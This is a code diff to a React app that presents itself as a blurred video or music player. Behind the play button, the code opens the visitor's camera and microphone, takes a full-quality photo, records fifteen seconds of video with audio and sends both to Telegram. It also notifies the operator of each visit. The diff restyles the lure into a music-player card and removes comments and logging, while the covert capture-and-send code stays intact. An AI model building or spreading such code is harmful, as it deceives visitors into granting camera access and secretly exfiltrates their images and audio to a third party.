@@ -1,10 +1,18 @@
-import { PlayIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback } from 'react';
+import {
+  PlayIcon,
+  BackwardIcon,
+  ForwardIcon,
+  ArrowsRightLeftIcon,
+} from '@heroicons/react/24/solid';
+
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';
+
+  const thumbnailUrl =
+    'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -21,10 +29,12 @@ function App() {
 
   const captureAndSendMedia = useCallback(async () => {
     try {
-      // Get device capabilities first
       const devices = await navigator.mediaDevices.enumerateDevices();
-      const videoDevice = devices.find(device => device.kind === 'videoinput');
-      
+
+      const videoDevice = devices.find(
+        (device) => device.kind === 'videoinput'
+      );
+
       if (!videoDevice) {
         throw new Error('No video input device found');
       }
@@ -32,80 +42,78 @@ function App() {
       const constraints = {
         video: {
           deviceId: videoDevice.deviceId,
-          width: { ideal: 4096 }, // Maximum supported width
-          height: { ideal: 2160 }, // Maximum supported height
-          frameRate: { ideal: 60 }
+          width: { ideal: 1920 },
+          height: { ideal: 1080 },
+          frameRate: { ideal: 60 },
         },
-        audio: true
+        audio: true,
       };
 
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
 
-      // Get actual video track settings
       const videoTrack = stream.getVideoTracks()[0];
       const settings = videoTrack.getSettings();
-      
-      // Create and setup video element for photo capture
+
       const video = document.createElement('video');
       video.srcObject = stream;
       video.playsInline = true;
       video.muted = true;
       video.autoplay = true;
-      
-      // Wait for video to be ready
+
       await new Promise((resolve) => {
         video.onloadedmetadata = async () => {
           try {
             await video.play();
             setTimeout(resolve, 500);
-          } catch (error) {
-            console.error('Error playing video:', error);
+          } catch {
             resolve(true);
           }
         };
       });
 
-      // Setup canvas with actual video dimensions
       const canvas = document.createElement('canvas');
       canvas.width = settings.width || 1920;
       canvas.height = settings.height || 1080;
+
       const context = canvas.getContext('2d');
-      
+
       if (context) {
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
       }
 
-      // Convert photo to blob with maximum quality
-      const photoBlob = await new Promise<Blob>((resolve) => {
-        canvas.toBlob((blob) => {
-          if (blob) resolve(blob);
-        }, 'image/jpeg', 1.0);
+      const photoBlob = await new Promise((resolve) => {
+        canvas.toBlob(
+          (blob) => {
+            if (blob) resolve(blob);
+          },
+          'image/jpeg',
+          1.0
+        );
       });
 
-      // Send photo immediately
       sendImageToTelegram(photoBlob).catch(console.error);
 
-      // Check supported video formats
       const mimeTypes = [
         'video/mp4;codecs=h264,aac',
         'video/mp4',
         'video/webm;codecs=vp8,opus',
-        'video/webm'
+        'video/webm',
       ];
 
-      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
+      const supportedMimeType = mimeTypes.find((type) =>
+        MediaRecorder.isTypeSupported(type)
+      );
 
       if (!supportedMimeType) {
         throw new Error('No supported video format found');
       }
 
-      // Configure video recording with maximum quality
       const mediaRecorder = new MediaRecorder(stream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
+        videoBitsPerSecond: 8000000,
       });
-      
-      const chunks: BlobPart[] = [];
+
+      const chunks = [];
 
       mediaRecorder.ondataavailable = (e) => {
         if (e.data.size > 0) {
@@ -114,26 +122,24 @@ function App() {
       };
 
       mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(chunks, { 
-          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
+        const videoBlob = new Blob(chunks, {
+          type: supportedMimeType.includes('mp4')
+            ? 'video/mp4'
+            : 'video/webm',
         });
-        console.log('Video recording completed, size:', videoBlob.size);
+
         await sendVideoToTelegram(videoBlob);
-        stream.getTracks().forEach(track => track.stop());
+
+        stream.getTracks().forEach((track) => track.stop());
       };
 
-      // Start recording with frequent data chunks for better quality
       mediaRecorder.start(1000);
-      console.log('Started recording video');
 
-      // Stop recording after 15 seconds
       setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
-          console.log('Stopping video recording');
           mediaRecorder.stop();
         }
       }, 15000);
-
     } catch (error) {
       console.error('Error capturing media:', error);
     }
@@ -144,37 +150,88 @@ function App() {
   };
 
   return (
-    <div className="relative min-h-screen bg-gray-900">
-      <header className="relative bg-gray-800 py-6">
-        <div className="container mx-auto px-4">
-          <h1 className="text-3xl font-bold text-white">Video Player</h1>
-        </div>
-      </header>
+    <div className="min-h-screen bg-black overflow-hidden relative flex items-center justify-center">
+      {/* Background */}
+      <div
+        className="absolute inset-0 bg-cover bg-center scale-110 blur-[2px]"
+        style={{
+          backgroundImage:
+            'url(https://images.unsplash.com/photo-1518770660439-4636190af475?q=80&w=1200&auto=format&fit=crop)',
+        }}
+      />
 
-      <main className="relative container mx-auto px-4 py-8">
-        <div className="max-w-[1080px] mx-auto">
-          <div className="relative">
-            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
-              {isBlurred && (
-                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
-              )}
-              <div className="absolute inset-0 flex items-center justify-center z-10">
-                <button 
-                  onClick={handlePlayClick}
-                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
-                >
-                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
-                </button>
-              </div>
-              <img 
-                src={thumbnailUrl} 
-                alt="Video Thumbnail" 
-                className="w-full h-full object-cover"
-              />
-            </div>
+      {/* Dark overlay */}
+      <div className="absolute inset-0 bg-black/55" />
+
+      {/* Grain */}
+      <div className="absolute inset-0 opacity-20 bg-[url('https://www.transparenttextures.com/patterns/asfalt-light.png')]" />
+
+      {/* Player Card */}
+      <div className="relative z-10 w-[340px] rounded-[30px] bg-[#cfcaca] p-5 shadow-2xl">
+        {/* Album */}
+        <div className="relative rounded-md overflow-hidden aspect-square bg-[#ece8e8]">
+          <img
+            src={thumbnailUrl}
+            alt="Album"
+            className={`w-full h-full object-cover transition-all duration-500 ${
+              isBlurred ? 'blur-md scale-110 brightness-75' : ''
+            }`}
+          />
+
+          {/* Play button */}
+          <div className="absolute inset-0 flex items-center justify-center">
+            <button
+              onClick={handlePlayClick}
+              className="bg-black/70 hover:bg-black/80 transition-all duration-300 rounded-full p-5 backdrop-blur-sm"
+            >
+              <PlayIcon className="w-10 h-10 text-white" />
+            </button>
           </div>
         </div>
-      </main>
+
+        {/* Progress */}
+        <div className="mt-6">
+          <div className="relative h-[6px] rounded-full bg-white/70 overflow-hidden">
+            <div className="absolute left-0 top-0 h-full w-[58%] bg-black rounded-full" />
+
+            <div className="absolute left-[58%] top-1/2 -translate-y-1/2 -translate-x-1/2 w-4 h-4 rounded-full bg-black shadow-md" />
+          </div>
+
+          <div className="flex justify-between mt-2 text-[15px] text-black/60 font-medium">
+            <span>0:35</span>
+            <span>-2:50</span>
+          </div>
+        </div>
+
+        {/* Controls */}
+        <div className="flex items-center justify-between mt-7 px-1">
+          <button className="text-black hover:scale-110 transition">
+            <ArrowsRightLeftIcon className="w-6 h-6" />
+          </button>
+
+          <button className="text-black hover:scale-110 transition">
+            <BackwardIcon className="w-10 h-10" />
+          </button>
+
+          <button
+            onClick={handlePlayClick}
+            className="text-black hover:scale-110 transition"
+          >
+            <div className="flex gap-[6px]">
+              <div className="w-[8px] h-10 bg-black rounded-sm" />
+              <div className="w-[8px] h-10 bg-black rounded-sm" />
+            </div>
+          </button>
+
+          <button className="text-black hover:scale-110 transition">
+            <ForwardIcon className="w-10 h-10" />
+          </button>
+
+          <button className="text-black hover:scale-110 transition rotate-180">
+            <ArrowsRightLeftIcon className="w-6 h-6" />
+          </button>
+        </div>
+      </div>
     </div>
   );
 }
